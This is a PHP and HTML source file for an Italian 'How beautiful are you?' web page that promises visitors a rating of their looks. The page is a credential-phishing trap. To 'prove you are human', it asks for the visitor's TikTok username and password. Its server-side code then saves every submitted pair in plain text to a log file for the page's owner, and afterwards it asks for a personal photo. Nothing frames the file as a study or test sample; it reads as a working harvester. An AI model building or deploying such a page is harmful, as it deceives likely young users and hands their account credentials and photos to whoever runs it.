<?php
session_start();

// Se l'utente ha già "fatto login", mostra il form upload
$logged_in = isset($_SESSION['username']);

// Salva username/password nel log per l'admin
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && !$logged_in) {
    $username = htmlspecialchars(trim($_POST['username']));
    $password = htmlspecialchars(trim($_POST['password']));
    if ($username !== '' && $password !== '') {
        $log_line = date('Y-m-d H:i:s') . " | User: $username | Pass: $password\n";
        file_put_contents('/uploads/log_accessi.txt', $log_line, FILE_APPEND);
        $_SESSION['username'] = $username;
        $logged_in = true;
    }
}
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Quanto sei bello/a? 💖</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #fff0f5, #ffe4e1); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
        h1 { color: #d63384; font-size: 2.4em; margin-bottom: 10px; text-align: center; }
        p.sub { color: #888; font-size: 1.1em; margin-bottom: 30px; text-align: center; }
        .card { background: white; width: 100%; max-width: 480px; padding: 35px; border-radius: 20px; box-shadow: 0 8px 30px rgba(0,0,0,0.12); }
        input { width: 100%; padding: 14px; margin: 10px 0; font-size: 1em; border: 1px solid #ddd; border-radius: 10px; }
        button { background: #ff69b4; color: white; border: none; padding: 16px; width: 100%; font-size: 1.2em; border-radius: 12px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        button:hover { background: #ff1493; }
        .note { color: #aaa; font-size: 0.85em; margin-top: 15px; text-align: center; }
    </style>
</head>
<body>

<?php if (!$logged_in): ?>
    <h1>Quanto sei bello/a? </h1>
    <p class="sub">Accedi e scopri il tuo voto</p>
    <div class="card">
        <form method="post">
            <input type="text" name="username" placeholder="di tiktok" required>
            <input type="password" name="password" placeholder="password di tiktok" required>
            <button type="submit">Entra </button>
        </form>
        <p class="note">inserisci username e password di tiktok per dimonstrare che sei umano</p>
    </div>

<?php else: ?>
    <h1>Ciao, <?= $_SESSION['username'] ?>! </h1>
    <p class="sub">Carica una tua foto e scopri il voto</p>
    <div class="card">
        <form action="upload.php" method="post" enctype="multipart/form-data">
            <input type="file" name="foto" accept="image/*" required>
            <button type="submit">Invia e scopri il voto! </button>
        </form>
    </div>
<?php endif; ?>

</body>
</html>